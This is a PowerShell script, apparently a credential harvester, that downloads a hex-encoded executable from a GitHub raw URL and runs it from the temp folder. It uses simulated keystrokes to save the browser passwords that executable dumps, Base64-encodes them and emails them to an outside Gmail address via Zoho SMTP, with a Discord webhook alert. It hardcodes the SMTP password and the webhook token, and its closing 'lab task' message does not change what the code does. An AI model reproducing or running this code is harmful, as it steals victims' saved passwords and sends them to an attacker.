$global:isEmailSent = $false
function SetEmailSentTrue {$global:isEmailSent = $true}
function SetEmailSentFalse {$global:isEmailSent = $false}

function Send-EmailNotification {
    param (
        [string]$ToEmail,
        [string]$WebhookUrl,
        [string]$Message
    )

    # Create the payload
    $payload = @{
        content = $Message
    } | ConvertTo-Json

    # Send the webhook notification
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
        Write-Host "Webhook notification sent successfully."
    } catch {
        Write-Host "Error sending webhook notification: $_"
    }
}

function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "srve650@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [string[]]$Attachments = @(),  # Optional parameter for attachments
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"

    # Create the email message
    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    # Attach files if provided
    foreach ($attachmentPath in $Attachments) {
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "Warning: File not found - $attachmentPath"
        }
    }

    # Configure the SMTP client
    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true  # Enables STARTTLS
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    # Send the email
    try {
        Write-Host "Sending Email.... please wait..."
        $smtpClient.Send($mailMessage)
        Write-Host "Email sent successfully."
        $message = "Email sent successfully to $toEmail. " + $Subject
        # Send the webhook notification
        Send-EmailNotification -ToEmail $toEmail -WebhookUrl $email_webhookUrl -Message $message
        SetEmailSentTrue
    } catch {
        Write-Host "Error: $_"
        SetEmailSentFalse
    } finally {
        # Clean up attachments and mail message
        foreach ($attachment in $mailMessage.Attachments) {
            $attachment.Dispose()
        }
        $mailMessage.Dispose()
    }
}

# 1. Define the executable path
# $exe = "$env:TEMP\example.exe"

# 2. Run the tool with full browser flags
# We use /stext "" to try and force output to the console, 
# but if that build is restricted, we use a temporary variable file.
# $tempFile = "$env:TEMP\tmp.txt"

# Execute with all browsers enabled (1 = Yes)
# & $exe /LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /stext $tempFile

# 3. Read the file into RAM and IMMEDIATELY delete the file


# Run WBPV 
        $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
        $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
        Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file

        # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
        $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
        $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file

        # Convert the hex string to a byte array
        $bytes = [byte[]]::new($hexString.Length / 2)
        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
        }

        # Create a temporary file to hold the executable
        $tempExePath = Join-Path $env:TEMP "example.exe"
        [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
        $process = Start-Process $tempExePath # Start the executable

        #  SAVED DATA 
        $outputFilePath = "$env:TEMP\data.txt"
        Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
        Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys

        # Simulate CTRL+A and then CTRL+S to save the file
        [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
        Start-Sleep -Milliseconds 500  # Wait a moment for selection
        [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
        Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

        # Send the output file path and Enter
        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
        Start-Sleep -Milliseconds 500  # Wait for the input
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

        Start-Sleep -Seconds 2 # Wait a moment for the file to save
        Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes

if (Test-Path $outputFilePath) {
    $rawData = Get-Content $outputFilePath | Out-String
    Start-Sleep -Seconds 2
    Remove-Item $outputFilePath -Force
}

# 4. Obfuscate the data using Base64
$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
$b64String = [System.Convert]::ToBase64String($bytes)

# 5. Create a Memory Stream from the scrambled data
$ms = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.StreamWriter($ms)
$writer.Write($b64String)
$writer.Flush()
$ms.Position = 0

# 6. Create the Email Attachment (exists only in RAM)
$attachment = New-Object Net.Mail.Attachment($ms, "$env:TEMP\data.txt")

# 7. Send Email via TLS
if (-not $isEmailSent) {
    # Email parameters
    $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
    $attachments = @($attachment)  # Array of attachment file paths
    Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
}

# 8. Secure Cleanup
$attachment.Dispose()
$ms.Dispose()
Write-Host "Lab Task Complete. Memory Purged." -ForegroundColor Green